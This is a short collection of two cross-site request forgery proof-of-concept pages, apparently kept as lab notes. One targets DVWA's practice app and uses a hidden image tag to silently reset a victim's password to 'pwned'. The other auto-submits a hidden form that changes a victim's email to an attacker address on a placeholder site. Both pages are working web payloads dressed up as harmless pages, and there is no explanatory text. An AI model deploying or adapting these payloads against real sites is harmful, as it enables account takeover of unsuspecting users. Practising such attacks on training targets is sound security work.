### Change Password - DVWA

```html
<html>
	<head>
		<title>Good site!</title>
	</head>
	<body>
		<h1>Hello world!</h1>
		<img style="display:none" src="http://192.168.0.11/dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change" alt="">
	</body>	
</html>
```

### Change Email Address - Portswigger
```html
<html> 
	<body>
		<form action="https://vulnerable-website.com/email/change" method="POST"> 
			<input type="hidden" name="email" value="pwned@evil-user.net" /> 
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>	
</html>
```
